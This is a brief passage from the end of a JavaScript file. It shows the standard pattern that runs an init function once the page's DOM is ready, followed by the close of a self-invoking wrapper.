  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
